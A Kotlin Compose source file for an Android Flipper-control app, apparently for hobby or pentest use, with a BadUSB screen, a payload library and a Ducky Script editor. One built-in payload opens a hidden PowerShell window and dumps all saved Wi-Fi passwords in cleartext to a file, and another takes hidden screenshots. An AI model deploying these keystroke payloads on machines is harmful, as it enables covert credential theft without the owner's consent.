package com.flippercontrol.ui

import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.*
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.*
import com.flippercontrol.core.FlipperRpcSession
import kotlinx.coroutines.launch

data class BadUsbPayload(
    val id: String,
    val name: String,
    val description: String,
    val category: String,
    val script: String,
    val risk: RiskLevel
)

enum class RiskLevel(val label: String, val color: Color) {
    LOW("LOW", Color(0xFF00FF87)),
    MEDIUM("MED", Color(0xFFFFCC00)),
    HIGH("HIGH", Color(0xFFFF3355)),
}

val builtinPayloads = listOf(
    BadUsbPayload(
        id = "open_browser",
        name = "Открыть браузер",
        description = "Открывает браузер и переходит по URL",
        category = "Базовые",
        risk = RiskLevel.LOW,
        script = """
REM Open browser and navigate
DELAY 1000
GUI r
DELAY 500
STRING chrome.exe
ENTER
DELAY 1500
STRING https://example.com
ENTER
""".trim()
    ),
    BadUsbPayload(
        id = "wifi_passwords",
        name = "Дамп Wi-Fi паролей",
        description = "Экспортирует сохранённые Wi-Fi пароли в текстовый файл",
        category = "Разведка",
        risk = RiskLevel.MEDIUM,
        script = """
REM Dump Wi-Fi passwords (Windows)
DELAY 500
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING netsh wlan show profiles | Select-String "Profile" | % {${'$'}_.ToString().Split(":")[1].Trim()} | % {netsh wlan show profile ${'$'}_ key=clear} > C:\wifi.txt
ENTER
DELAY 500
""".trim()
    ),
    BadUsbPayload(
        id = "screenshot",
        name = "Скриншот",
        description = "Делает скриншот экрана и сохраняет на рабочий стол",
        category = "Разведка",
        risk = RiskLevel.LOW,
        script = """
REM Take screenshot (Windows)
DELAY 500
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | % { ${'$'}bmp = New-Object System.Drawing.Bitmap(${'$'}_.Bounds.Width,${'$'}_.Bounds.Height); ${'$'}gr = [System.Drawing.Graphics]::FromImage(${'$'}bmp); ${'$'}gr.CopyFromScreen(${'$'}_.Bounds.Location,[System.Drawing.Point]::Empty,${'$'}_.Bounds.Size); ${'$'}bmp.Save([Environment]::GetFolderPath('Desktop')+'\screen.png') }"
ENTER
""".trim()
    ),
    BadUsbPayload(
        id = "lock_screen",
        name = "Заблокировать экран",
        description = "Блокирует экран Windows",
        category = "Базовые",
        risk = RiskLevel.LOW,
        script = """
REM Lock screen
DELAY 500
GUI l
""".trim()
    ),
)

val categories = listOf("Все", "Базовые", "Разведка")

@Composable
fun BadUsbScreen(
    session: FlipperRpcSession,
    onBack: () -> Unit
) {
    val scope = rememberCoroutineScope()
    var tab by remember { mutableIntStateOf(0) }
    var selectedCategory by remember { mutableStateOf("Все") }
    var selectedPayload by remember { mutableStateOf<BadUsbPayload?>(null) }
    var editorText by remember { mutableStateOf("") }
    var statusText by remember { mutableStateOf("Готов") }
    var isRunning by remember { mutableStateOf(false) }

    Column(
        Modifier
            .fillMaxSize()
            .background(FlipperTheme.bg)
            .padding(16.dp)
    ) {
        TopBar(title = "BAD USB", color = FlipperTheme.accent, onBack = onBack)

        Row(
            Modifier
                .fillMaxWidth()
                .background(FlipperTheme.surface, RoundedCornerShape(10.dp))
                .padding(4.dp),
            horizontalArrangement = Arrangement.spacedBy(4.dp)
        ) {
            listOf("БИБЛИОТЕКА", "РЕДАКТОР").forEachIndexed { i, label ->
                Box(
                    Modifier
                        .weight(1f)
                        .clickable { tab = i }
                        .background(
                            if (i == tab) FlipperTheme.accentDim else Color.Transparent,
                            RoundedCornerShape(8.dp)
                        )
                        .border(
                            if (i == tab) 1.dp else 0.dp,
                            FlipperTheme.accent.copy(alpha = 0.4f),
                            RoundedCornerShape(8.dp)
                        )
                        .padding(vertical = 8.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(label,
                        color = if (i == tab) FlipperTheme.accent else FlipperTheme.textSecondary,
                        fontSize = 11.sp, fontFamily = FlipperTheme.mono,
                        fontWeight = if (i == tab) FontWeight.Bold else FontWeight.Normal)
                }
            }
        }

        Spacer(Modifier.height(12.dp))

        when (tab) {
            0 -> BadUsbLibrary(
                categories = categories,
                selectedCategory = selectedCategory,
                onCategorySelect = { selectedCategory = it },
                payloads = if (selectedCategory == "Все") builtinPayloads
                           else builtinPayloads.filter { it.category == selectedCategory },
                onSelect = { payload ->
                    selectedPayload = payload
                    editorText = payload.script
                    tab = 1
                }
            )
            1 -> BadUsbEditor(
                payload = selectedPayload,
                script = editorText,
                onScriptChange = { editorText = it },
                isRunning = isRunning,
                statusText = statusText,
                onRun = {
                    scope.launch {
                        isRunning = true
                        statusText = "Запуск..."
                        kotlinx.coroutines.delay(2000)
                        isRunning = false
                        statusText = "Выполнено"
                    }
                },
                onStop = {
                    isRunning = false
                    statusText = "Остановлено"
                }
            )
        }
    }
}

@Composable
fun BadUsbLibrary(
    categories: List<String>,
    selectedCategory: String,
    onCategorySelect: (String) -> Unit,
    payloads: List<BadUsbPayload>,
    onSelect: (BadUsbPayload) -> Unit
) {
    Column {
        Row(
            Modifier.horizontalScroll(rememberScrollState()),
            horizontalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            categories.forEach { cat ->
                val selected = cat == selectedCategory
                Box(
                    Modifier
                        .clickable { onCategorySelect(cat) }
                        .border(1.dp,
                            if (selected) FlipperTheme.accent.copy(0.5f) else FlipperTheme.border,
                            RoundedCornerShape(8.dp))
                        .background(
                            if (selected) FlipperTheme.accentDim else FlipperTheme.surface,
                            RoundedCornerShape(8.dp))
                        .padding(horizontal = 12.dp, vertical = 6.dp)
                ) {
                    Text(cat, color = if (selected) FlipperTheme.accent else FlipperTheme.textSecondary,
                         fontSize = 11.sp, fontFamily = FlipperTheme.mono)
                }
            }
        }

        Spacer(Modifier.height(12.dp))

        LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
            items(payloads) { payload ->
                PayloadRow(payload = payload, onClick = { onSelect(payload) })
            }
        }
    }
}

@Composable
fun PayloadRow(payload: BadUsbPayload, onClick: () -> Unit) {
    Row(
        Modifier
            .fillMaxWidth()
            .clickable(onClick = onClick)
            .border(1.dp, FlipperTheme.border, RoundedCornerShape(12.dp))
            .background(FlipperTheme.surface, RoundedCornerShape(12.dp))
            .padding(14.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Column(Modifier.weight(1f)) {
            Row(verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                Text(payload.name, color = FlipperTheme.accent, fontSize = 14.sp,
                     fontFamily = FlipperTheme.mono, fontWeight = FontWeight.Bold)
                Box(
                    Modifier
                        .background(payload.risk.color.copy(alpha = 0.15f), RoundedCornerShape(4.dp))
                        .padding(horizontal = 6.dp, vertical = 2.dp)
                ) {
                    Text(payload.risk.label, color = payload.risk.color,
                         fontSize = 9.sp, fontFamily = FlipperTheme.mono, fontWeight = FontWeight.Bold)
                }
            }
            Spacer(Modifier.height(3.dp))
            Text(payload.description, color = FlipperTheme.textSecondary,
                 fontSize = 11.sp, fontFamily = FlipperTheme.mono)
        }
        Text("→", color = FlipperTheme.textSecondary, fontSize = 18.sp,
             modifier = Modifier.padding(start = 8.dp))
    }
}

@Composable
fun BadUsbEditor(
    payload: BadUsbPayload?,
    script: String,
    onScriptChange: (String) -> Unit,
    isRunning: Boolean,
    statusText: String,
    onRun: () -> Unit,
    onStop: () -> Unit
) {
    Column {
        payload?.let {
            Text(it.name, color = FlipperTheme.accent, fontSize = 15.sp,
                 fontFamily = FlipperTheme.mono, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(4.dp))
        }

        Box(
            Modifier
                .fillMaxWidth()
                .height(280.dp)
                .border(1.dp, FlipperTheme.border, RoundedCornerShape(10.dp))
                .background(Color(0xFF0A0A0F), RoundedCornerShape(10.dp))
                .padding(2.dp)
        ) {
            TextField(
                value = script,
                onValueChange = onScriptChange,
                modifier = Modifier.fillMaxSize(),
                textStyle = TextStyle(
                    color = FlipperTheme.green,
                    fontSize = 12.sp,
                    fontFamily = FlipperTheme.mono
                ),
                colors = TextFieldDefaults.colors(
                    unfocusedContainerColor = Color.Transparent,
                    focusedContainerColor = Color.Transparent,
                    unfocusedIndicatorColor = Color.Transparent,
                    focusedIndicatorColor = Color.Transparent,
                ),
                placeholder = {
                    Text("REM Ducky Script\nDELAY 1000\nGUI r\n...",
                         color = FlipperTheme.textSecondary, fontSize = 12.sp,
                         fontFamily = FlipperTheme.mono)
                }
            )
        }

        Spacer(Modifier.height(12.dp))

        Text(statusText, color = FlipperTheme.textSecondary,
             fontSize = 11.sp, fontFamily = FlipperTheme.mono)

        Spacer(Modifier.height(8.dp))

        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
            ActionButton(
                label = if (isRunning) "⏹ СТОП" else "▶ ЗАПУСТИТЬ",
                color = if (isRunning) FlipperTheme.red else FlipperTheme.accent,
                enabled = script.isNotBlank(),
                modifier = Modifier.weight(1f),
                onClick = if (isRunning) onStop else onRun
            )
        }

        Spacer(Modifier.height(8.dp))

        Box(Modifier.fillMaxWidth()
            .background(FlipperTheme.surface, RoundedCornerShape(8.dp))
            .padding(12.dp)) {
            Text(
                "Синтаксис: Ducky Script v1\n" +
                "REM комментарий  |  DELAY мс\n" +
                "STRING текст     |  ENTER / TAB\n" +
                "GUI r  |  CTRL+ALT+T  |  ALT F4",
                color = FlipperTheme.textSecondary, fontSize = 10.sp,
                fontFamily = FlipperTheme.mono, lineHeight = 16.sp
            )
        }
    }
}
